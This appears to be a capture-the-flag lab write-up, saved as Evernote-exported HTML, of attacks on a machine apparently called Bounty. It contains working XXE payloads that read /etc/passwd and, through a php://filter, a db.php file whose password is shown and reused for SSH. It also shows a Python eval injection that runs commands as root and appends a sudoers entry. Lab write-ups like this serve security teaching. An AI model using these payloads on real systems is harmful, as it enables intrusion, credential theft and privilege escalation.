@@ -1,0 +1,70 @@
+<html>
+  
+  <head>
+    <meta charset="utf-8">
+  </head>
+  
+  <body>
+    <p>We have XML injection here <a href="http://10.10.11.100/log_submit.php">http://10.10.11.100/log_submit.php</a>
+      <br>&nbsp;</p>
+    <p>I capture the request in burp, the data we enter is sent after data= then
+      it is base64 encoded and url encoded(key characters only)</p>
+    <p>Where we put &amp;xxe; we get the injection. We tested this with /etc/passwd.</p>
+    <p>data=&lt;?xml&nbsp; version="1.0" encoding="ISO-8859-1"?&gt;</p>
+    <p>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</p>
+    <p>&lt;bugreport&gt;</p>
+    <p>&lt;title&gt;&amp;xxe;&lt;/title&gt;</p>
+    <p>&lt;cwe&gt;hack&lt;/cwe&gt;</p>
+    <p>&lt;cvss&gt;hack&lt;/cvss&gt;</p>
+    <p>&lt;reward&gt;20&lt;/reward&gt;</p>
+    <p>&lt;/bugreport&gt;</p>
+    <p>Base64 payload</p>
+    <p>PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4NCjwhRE9DVFlQRSBmb28gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPg0KCQk8YnVncmVwb3J0Pg0KCQk8dGl0bGU%2bJnh4ZTs8L3RpdGxlPg0KCQk8Y3dlPmhhY2s8L2N3ZT4NCgkJPGN2c3M%2baGFjazwvY3Zzcz4NCgkJPHJld2FyZD4yMDwvcmV3YXJkPg0KCQk8L2J1Z3JlcG9ydD4%3d</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/b4f9efa6-c5b1-7621-e2dc-154350d07102/image.png"
+      alt="">
+    </p>
+    <p>we can read the db.php file we found using php filters</p>
+    <p>&lt;?xml&nbsp; version="1.0" encoding="ISO-8859-1"?&gt;</p>
+    <p>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"&gt;
+      ]&gt;</p>
+    <p>&lt;bugreport&gt;</p>
+    <p>&lt;title&gt;&amp;xxe;&lt;/title&gt;</p>
+    <p>&lt;cwe&gt;hack&lt;/cwe&gt;</p>
+    <p>&lt;cvss&gt;hack&lt;/cvss&gt;</p>
+    <p>&lt;reward&gt;20&lt;/reward&gt;</p>
+    <p>&lt;/bugreport&gt;</p>
+    <p>We dump the db file using the payload above</p>
+    <p>&lt;?php</p>
+    <p>// TODO -&gt; Implement login system with the database.</p>
+    <p>$dbserver = "localhost";</p>
+    <p>$dbname = "bounty";</p>
+    <p>$dbusername = "admin";</p>
+    <p>$dbpassword = "m19RoAU0hP41A1sTsq6K";</p>
+    <p>$testuser = "test";</p>
+    <p>?&gt;</p>
+    <p>We can ssh in with</p>
+    <p>development:m19RoAU0hP41A1sTsq6K</p>
+    <p>We can run a ticket creation python script as root. The script has an
+      eval function that we can exploit.</p>
+    <p>I create a test file named <a href="http://test.md">test.md</a>
+      <br>&nbsp;</p>
+    <p># Skytrain Inc Ticket</p>
+    <p>## Ticket to Destination: London</p>
+    <p>__Ticket Code:__</p>
+    <p>**32+110+43+ __import__('os').system('whoami')**</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/9207784e-b74f-b944-f122-5954d6c95915/image.png"
+      alt="">
+    </p>
+    <p>I make a script to echo development into the sudoers folder so I can su
+      to root.</p>
+    <p>**32+110+43+ __import__('os').system('echo "development ALL=(ALL) ALL"
+      &gt;&gt; /etc/sudoers')**</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/38e78239-12f1-0b52-cc4f-e1a43d131d70/image.png"
+      alt="">
+    </p>
+  </body>
+
+</html>
